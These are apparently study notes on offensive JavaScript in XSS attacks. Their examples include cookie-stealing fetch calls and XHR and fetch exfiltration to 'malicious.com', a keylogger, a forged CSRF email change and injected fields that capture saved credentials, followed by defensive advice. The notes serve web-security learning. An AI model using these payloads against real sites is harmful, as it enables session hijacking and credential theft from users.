### 📚 **Offensive JavaScript Notes**

---

### 🚀 **High-Level Summary**

**Offensive JavaScript** techniques leverage the **power of JavaScript** for **malicious activities** beyond simple pop-ups like `alert(1)`. These attacks include **stealing sensitive data**, **manipulating the DOM**, and **exfiltrating data** to external servers. Attackers often exploit **XSS vulnerabilities** to access **local storage**, **cookies**, and **perform unauthorized actions** on behalf of the victim.

---

### 📦 **Definition Bank**

|**Term**|**Definition**|
|---|---|
|**localStorage**|A **persistent** browser storage mechanism that retains data even after the browser is closed.|
|**sessionStorage**|A **temporary** storage mechanism that clears data when the tab is closed.|
|**document.cookie**|A property that stores **HTTP cookies** associated with the current page.|
|**XMLHttpRequest (XHR)**|A **legacy JavaScript API** for sending HTTP requests.|
|**Fetch API**|A **modern, promise-based** API for making HTTP requests and handling responses in JavaScript.|
|**Keylogging**|A technique where keystrokes are **captured** and potentially exfiltrated by malicious actors.|
|**CSRF (Cross-Site Request Forgery)**|An attack that **tricks users** into making unauthorized requests to a website where they are authenticated.|

---

### 📡 **Key Concepts and Explanations**

1. **Accessing Local & Session Storage**
    
    - Attackers can access **stored data** directly in the browser.
    - Example of extracting stored data:
    
    ```javascript
    let localStorageData = JSON.stringify(localStorage);
    let sessionStorageData = JSON.stringify(sessionStorage);
    ```
    
    ✅ **Explanation:** The data stored in `localStorage` persists after the browser closes, while `sessionStorage` clears after the session ends.

---

2. **Stealing Cookies**
    
    - Cookies can store **sensitive data** like **session tokens**.
    - Example payload for cookie theft:
    
    ```javascript
    fetch("http://malicious.com?cookie=" + document.cookie);
    ```
    
    ✅ **Explanation:** This code sends the user's cookies to a remote server via an HTTP request, enabling **session hijacking**.

---

3. **Building HTTP Requests (Data Exfiltration)**
    
    - **Legacy Approach:** Using `XMLHttpRequest`:
    
    ```javascript
    let xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://malicious.com');
    xhr.send('data=stolen');
    ```
    
    - **Modern Approach:** Using the `Fetch API`:
    
    ```javascript
    fetch('http://malicious.com', {
        method: 'POST',
        body: JSON.stringify({ data: 'stolen' })
    });
    ```
    
    ✅ **Explanation:** `Fetch` is cleaner and commonly used for **data exfiltration** due to its simplicity and asynchronous handling.

---

4. **Keylogging (Capturing Keystrokes)**
    
    - Capturing **every keystroke** made by the victim:
    
    ```javascript
    document.onkeypress = function(e) {
        let key = String.fromCharCode(e.keyCode);
        console.log("Key Pressed:", key);
    }
    ```
    
    ✅ **Explanation:** This code logs each keystroke, making it possible to capture **passwords** or **sensitive data** typed by the user.

---

5. **Session Riding (CSRF)**
    
    - Exploiting a logged-in user by **automatically submitting a form** on their behalf:
    
    ```javascript
    let xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://victim.com/updateprofile');
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('email=attacker@evil.com');
    ```
    
    ✅ **Explanation:** The attacker **forges a request** using the victim's session, manipulating their account data without consent.

---

6. **Saved Credentials Capture**
    
    - Creating fake input fields to capture **user credentials**:
    
    ```javascript
    let usernameField = document.createElement('input');
    usernameField.type = 'text';
    usernameField.name = 'username';
    document.body.appendChild(usernameField);
    
    let passwordField = document.createElement('input');
    passwordField.type = 'password';
    passwordField.name = 'password';
    document.body.appendChild(passwordField);
    
    setTimeout(function() {
        console.log("Captured Username:", document.getElementsByName('username')[0].value);
        console.log("Captured Password:", document.getElementsByName('password')[0].value);
    }, 1000);
    ```
    
    ✅ **Explanation:** The script injects fields and logs **input data**, potentially capturing **saved credentials** in the browser.

---

### 🔑 **Comparisons and Alternatives**

|**Approach**|**Secure?**|**Explanation**|
|---|---|---|
|**localStorage for sensitive data**|❌|Easily accessible by JavaScript, making it vulnerable to XSS attacks.|
|**HttpOnly Cookies**|✅|Prevents JavaScript access to cookies, mitigating most XSS risks.|
|**CSP (Content Security Policy)**|✅|Restricts which scripts can execute on a page, reducing XSS impact.|
|**CSRF Tokens**|✅|Tokens prevent unauthorized requests by requiring a **unique, per-request token.**|

---

### 🛡️ **Best Practices for Defense Against Offensive JS Techniques**

- **Use `HttpOnly` Cookies:** Prevent direct JavaScript access to sensitive cookies.
- **Enable CSP (Content Security Policy):** Restrict inline JavaScript execution.
- **Validate and Escape Inputs:** Use proper escaping for **attribute contexts** and inputs.
- **Limit Local Storage Usage:** Avoid storing **sensitive data** like tokens in local storage.
- **Implement CSRF Tokens:** Generate and validate **unique tokens** for each form submission.

---

### ✅ **Code Example: Secure Fetch Usage**

```javascript
fetch('https://secure-website.com/api/data', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'CSRF-Token': 'uniqueToken12345'
    },
    body: JSON.stringify({ data: 'safeData' })
});
```

✅ **Explanation:**

- **Token-based validation** prevents CSRF attacks.
- **Proper headers** ensure the request is authenticated securely.
- **Data sanitization** and escaping reduce injection risks.

---